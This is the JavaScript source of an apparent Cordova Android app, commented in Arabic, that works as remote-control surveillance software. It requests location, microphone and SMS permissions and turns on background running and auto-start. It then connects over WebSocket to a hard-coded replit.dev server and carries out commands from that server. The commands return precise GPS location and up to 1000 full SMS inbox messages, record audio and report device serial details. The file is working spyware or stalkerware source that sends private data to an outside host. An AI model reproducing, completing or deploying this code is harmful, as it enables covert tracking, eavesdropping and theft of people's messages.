document.addEventListener('deviceready', onDeviceReady, false);

// تخزين الطلبات المستلمة
const receivedRequests = [];

// متغير لتخزين حالة الأذونات
let permissionsGranted = false;

function onDeviceReady() {
  console.log('Device is ready');
  
  // طلب الأذونات اللازمة
  requestPermissions();
  
  // تمكين التشغيل في الخلفية
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.setDefaults({
      title: 'التطبيق يعمل في الخلفية',
      text: 'جارٍ مراقبة الأوامر الواردة',
      hidden: false,
      resume: true,
      silent: false
    });
    
    // إعدادات إضافية للخلفية
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
      console.log('App is running in background');
    });
    
    cordova.plugins.backgroundMode.on('deactivate', function() {
      console.log('App is running in foreground');
    });
  }

  // معلومات الجهاز
  const deviceInfo = {
    uuid: device.uuid || generateUUID(),
    model: device.model || 'Unknown',
    platform: device.platform || 'Unknown',
    version: device.version || 'Unknown',
    manufacturer: device.manufacturer || 'Unknown',
    battery: null,
    timestamp: new Date().toISOString()
  };
  
  // توليد UUID إذا لم يكن موجوداً
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0;
      const v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }
  
  // الحصول على حالة البطارية
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      connectToServer(deviceInfo);
      
      // مراقبة تغيرات البطارية
      battery.addEventListener('levelchange', updateBatteryInfo);
      battery.addEventListener('chargingchange', updateBatteryInfo);
    }).catch(error => {
      console.error('Battery API error:', error);
      connectToServer(deviceInfo);
    });
  } else {
    connectToServer(deviceInfo);
  }
  
  function updateBatteryInfo() {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100),
        charging: battery.charging,
        chargingTime: battery.chargingTime,
        dischargingTime: battery.dischargingTime
      };
      
      // إرسال تحديث البطارية إلى الخادم
      if (window.wsConnection && window.wsConnection.readyState === WebSocket.OPEN) {
        window.wsConnection.send(JSON.stringify({
          type: 'device_update',
          deviceInfo: {
            battery: deviceInfo.battery,
            timestamp: new Date().toISOString()
          }
        }));
      }
    });
  }
}

// طلب الأذونات اللازمة
function requestPermissions() {
  const permissions = [
    'android.permission.ACCESS_FINE_LOCATION',
    'android.permission.ACCESS_COARSE_LOCATION',
    'android.permission.RECORD_AUDIO',
    'android.permission.READ_SMS',
    'android.permission.RECEIVE_SMS',
    'android.permission.WRITE_EXTERNAL_STORAGE',
    'android.permission.READ_EXTERNAL_STORAGE',
    'android.permission.WAKE_LOCK',
    'android.permission.FOREGROUND_SERVICE'
  ];
  
  const permissionsToRequest = [];
  
  permissions.forEach(permission => {
    cordova.plugins.permissions.checkPermission(permission, 
      function(status) {
        if (!status.hasPermission) {
          permissionsToRequest.push(permission);
        }
      },
      function(error) {
        console.error('Error checking permission:', error);
      }
    );
  });
  
  if (permissionsToRequest.length > 0) {
    cordova.plugins.permissions.requestPermissions(
      permissionsToRequest,
      function(status) {
        if (status.hasPermission) {
          console.log('All permissions granted');
          permissionsGranted = true;
          
          // بدء التشغيل التلقائي عند منح الأذونات
          if (cordova.plugins.autoStart) {
            cordova.plugins.autoStart.enable();
            console.log('Auto start enabled');
          }
        } else {
          console.log('Some permissions denied');
          alert('يجب منح جميع الأذونات لكي يعمل التطبيق بشكل صحيح');
        }
      },
      function(error) {
        console.error('Error requesting permissions:', error);
      }
    );
  } else {
    permissionsGranted = true;
    
    // بدء التشغيل التلقائي إذا كانت الأذونات ممنوحة مسبقًا
    if (cordova.plugins.autoStart) {
      cordova.plugins.autoStart.enable();
      console.log('Auto start enabled');
    }
  }
}

function connectToServer(deviceInfo) {
  // استخدام رابط الخادم المقدم
  const wsUrl = 'wss://0c0d4d48-f2d0-4f6b-9a7c-dfaeba1f204e-00-1fpda24jsv608.sisko.replit.dev';
  window.wsConnection = new WebSocket(wsUrl);
  
  wsConnection.onopen = () => {
    console.log('Connected to server');
    
    // تسجيل الجهاز
    wsConnection.send(JSON.stringify({
      type: 'register',
      deviceId: deviceInfo.uuid,
      deviceInfo
    }));
  };
  
  wsConnection.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.type === 'command') {
        console.log('Received command:', data.command);
        // تخزين الطلب المستلم
        receivedRequests.push({
          ...data.command,
          receivedAt: new Date().toISOString()
        });
        
        // تنفيذ الأمر وإرسال الرد
        executeCommand(data.command, (response) => {
          if (wsConnection.readyState === WebSocket.OPEN) {
            wsConnection.send(JSON.stringify({
              type: 'response',
              commandId: data.commandId,
              response: {
                ...response,
                requestData: data.command // إضافة بيانات الطلب الأصلي للرجوع إليها
              }
            }));
          }
        });
      }
      else if (data.type === 'registered') {
        console.log('Device registered successfully:', data);
      }
      
    } catch (error) {
      console.error('Error processing message:', error);
    }
  };
  
  wsConnection.onerror = (error) => {
    console.error('WebSocket error:', error);
  };
  
  wsConnection.onclose = () => {
    console.log('Disconnected from server');
    // إعادة الاتصال بعد تأخير
    setTimeout(() => connectToServer(deviceInfo), 10000);
  };
  
  // إرسال نبضات قلبية دورية
  const heartbeatInterval = setInterval(() => {
    if (wsConnection.readyState === WebSocket.OPEN) {
      wsConnection.send(JSON.stringify({ 
        type: 'heartbeat',
        timestamp: new Date().toISOString(),
        receivedRequests // إرسال سجل الطلبات المستلمة
      }));
    } else {
      clearInterval(heartbeatInterval);
    }
  }, 30000);
}

function executeCommand(command, callback) {
  console.log('Executing command:', command);
  
  // إضافة commandId للتعقب
  const commandId = Date.now();
  
  switch (command.type) {
    case 'get_location':
      getLocation(commandId, callback);
      break;
    case 'get_sms':
      getSMS(commandId, callback);
      break;
    case 'record_audio':
      recordAudio(commandId, command.duration, callback);
      break;
    case 'get_device_info':
      getDeviceInfo(commandId, callback);
      break;
    case 'get_received_requests':
      getReceivedRequests(commandId, callback);
      break;
    case 'download_sms_txt':
      downloadSMSTxt(commandId, callback);
      break;
    default:
      callback({ 
        commandId,
        status: 'error',
        error: 'Unknown command',
        receivedCommand: command
      });
  }
}

function getLocation(commandId, callback) {
  const options = {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  };
  
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const locationData = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        altitudeAccuracy: position.coords.altitudeAccuracy,
        heading: position.coords.heading,
        speed: position.coords.speed,
        timestamp: position.timestamp
      };
      
      callback({
        commandId,
        status: 'success',
        location: locationData,
        googleMapsLink: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Location error',
        details: {
          code: error.code,
          message: error.message,
          PERMISSION_DENIED: error.PERMISSION_DENIED,
          POSITION_UNAVAILABLE: error.POSITION_UNAVAILABLE,
          TIMEOUT: error.TIMEOUT
        }
      });
    },
    options
  );
}

function getSMS(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000, // زيادة الحد الأقصى للرسائل
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      callback({
        commandId,
        status: 'success',
        count: messages.length,
        messages: messages.map(msg => ({
          id: msg._id,
          address: msg.address,
          body: msg.body, // عرض النص الكامل بدون قص
          date: msg.date,
          read: msg.read
        }))
      });
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

// دالة لتنزيل رسائل SMS كملف نصي
function downloadSMSTxt(commandId, callback) {
  if (typeof SMS === 'undefined') {
    return callback({ 
      commandId,
      status: 'error',
      error: 'SMS plugin not available',
      suggestion: 'Install cordova-sms-plugin'
    });
  }
  
  const filter = {
    box: 'inbox',
    maxCount: 1000,
    indexFrom: 0
  };
  
  SMS.listSMS(
    filter,
    (messages) => {
      try {
        // إنشاء محتوى الملف النصي
        let txtContent = "رسائل SMS\n\n";
        messages.forEach((msg, index) => {
          txtContent += `رسالة ${index + 1}:\n`;
          txtContent += `من: ${msg.address}\n`;
          txtContent += `التاريخ: ${new Date(msg.date).toLocaleString('ar-EG')}\n`;
          txtContent += `المحتوى: ${msg.body}\n`;
          txtContent += "------------------------\n\n";
        });
        
        // إنشاء Blob من المحتوى
        const blob = new Blob([txtContent], { type: 'text/plain' });
        
        // حفظ الملف
        const fileName = `sms_messages_${new Date().getTime()}.txt`;
        saveFileToStorage(fileName, blob, (fileUrl) => {
          callback({
            commandId,
            status: 'success',
            file: {
              name: fileName,
              type: 'text/plain',
              size: blob.size,
              downloadUrl: fileUrl
            }
          });
        });
      } catch (error) {
        callback({ 
          commandId,
          status: 'error',
          error: 'Error creating TXT file',
          details: error.message
        });
      }
    },
    (error) => {
      callback({ 
        commandId,
        status: 'error',
        error: 'SMS error',
        details: error
      });
    }
  );
}

function recordAudio(commandId, duration, callback) {
  duration = duration || 10; // Default 10 seconds
  
  const mediaRecorderOptions = {
    mimeType: 'audio/webm; codecs=opus', // استخدام صيغة متوافقة
    audioBitsPerSecond: 128000
  };
  
  navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
      const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
      const audioChunks = [];
      
      mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
      };
      
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        
        // تحويل إلى MP3 إذا أمكن، أو استخدام الصيغة الأصلية
        processAudioBlob(audioBlob, (processedBlob, format) => {
          const audioUrl = URL.createObjectURL(processedBlob);
          
          // حفظ التسجيل في التخزين المحلي
          const fileName = `recording_${commandId}.${format}`;
          saveFileToStorage(fileName, processedBlob, (fileUrl) => {
            callback({ 
              commandId,
              status: 'success',
              audio: {
                duration: duration,
                format: format,
                size: processedBlob.size,
                downloadUrl: fileUrl,
                fileName: fileName
              }
            });
          });
        });
      };
      
      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
        stream.getTracks().forEach(track => track.stop());
      }, duration * 1000);
    })
    .catch(error => {
      callback({ 
        commandId,
        status: 'error',
        error: 'Audio recording error',
        details: error.message
      });
    });
}

// معالجة ملف الصوت (يمكن التوسيع في المستقبل للتحويل إلى MP3)
function processAudioBlob(blob, callback) {
  // في هذه النسخة، نستخدم الصيغة الأصلية
  // يمكن إضافة تحويل إلى MP3 باستخدام مكتبات خارجية لاحقًا
  callback(blob, 'webm');
}

// دالة عامة لحفظ الملفات
function saveFileToStorage(fileName, blob, callback) {
  window.resolveLocalFileSystemURL(cordova.file.externalDataDirectory || cordova.file.dataDirectory, 
    (dir) => {
      dir.getFile(fileName, { create: true }, (fileEntry) => {
        fileEntry.createWriter((fileWriter) => {
          fileWriter.onwriteend = () => {
            console.log('File saved:', fileName);
            callback(fileEntry.toURL());
          };
          fileWriter.onerror = (e) => {
            console.error('Error saving file:', e);
            callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
          };
          fileWriter.write(blob);
        });
      }, (error) => {
        console.error('Error getting file:', error);
        callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
      });
    }, 
    (error) => {
      console.error('Error accessing filesystem:', error);
      callback(URL.createObjectURL(blob)); // استخدام URL مؤقت إذا فشل الحفظ
    }
  );
}

function getDeviceInfo(commandId, callback) {
  const info = {
    cordova: device.cordova,
    model: device.model,
    platform: device.platform,
    uuid: device.uuid,
    version: device.version,
    manufacturer: device.manufacturer,
    isVirtual: device.isVirtual,
    serial: device.serial
  };
  
  callback({
    commandId,
    status: 'success',
    deviceInfo: info
  });
}

function getReceivedRequests(commandId, callback) {
  callback({
    commandId,
    status: 'success',
    requests: receivedRequests,
    count: receivedRequests.length
  });
}

// إعادة الاتصال عند استئناف التطبيق
document.addEventListener('resume', () => {
  if (window.wsConnection && window.wsConnection.readyState !== WebSocket.OPEN) {
    console.log('App resumed, reconnecting...');
    onDeviceReady();
  }
}, false);

// إعدادات التشغيل التلقائي عند بدء التشغيل
document.addEventListener('resume', function() {
  if (cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
  }
}, false);

document.addEventListener('pause', function() {
  if (cordova.plugins.backgroundMode && cordova.plugins.backgroundMode.isEnabled()) {
    cordova.plugins.backgroundMode.disable();
  }
}, false);
